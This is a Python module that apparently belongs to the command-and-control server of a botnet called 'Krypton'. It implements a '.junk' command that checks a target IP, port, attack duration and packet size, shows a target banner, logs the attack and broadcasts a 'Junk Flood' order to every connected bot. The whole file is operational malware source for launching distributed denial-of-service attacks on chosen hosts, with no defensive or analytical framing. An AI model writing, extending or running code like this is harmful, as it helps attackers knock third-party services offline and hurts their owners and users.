from colorama import Fore
from src.utils.validator import Validator
from src.utils.logger import Logger

def junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    logger = Logger()
    validator = Validator()

    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
            %sSIZE:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, size, Fore.CYAN, Fore.LIGHTWHITE_EX, 'Junk Flood')

        if validator.validate_ip(ip):
            if validator.validate_port(port):
                if validator.validate_time(secs):
                    if validator.validate_size(size):
                        for x in xxxx.split('\n'):
                            send(client, '\x1b[3;31;40m'+ x)
                        send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                        logger.log_attack('Junk Flood', ip, secs, 'Started')
                        broadcast(data)
                    else:
                        error_msg = 'Invalid packet size (1-65500 bytes)'
                        logger.error(f"Attack validation failed - {error_msg}")
                        send(client, Fore.RED + '\n' + error_msg + '\n')
                else:
                    error_msg = 'Invalid attack duration (10-1300 seconds)'
                    logger.error(f"Attack validation failed - {error_msg}")
                    send(client, Fore.RED + '\n' + error_msg + '\n')
            else:
                error_msg = 'Invalid port number (1-65535)'
                logger.error(f"Attack validation failed - {error_msg}")
                send(client, Fore.RED + '\n' + error_msg + '\n')
        else:
            error_msg = 'Invalid IP-address'
            logger.error(f"Attack validation failed - {error_msg}")
            send(client, Fore.RED + '\n' + error_msg + '\n')
    else:
        logger.warning("Invalid command format")
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.junk [IP] [PORT] [TIME] [SIZE]\n')
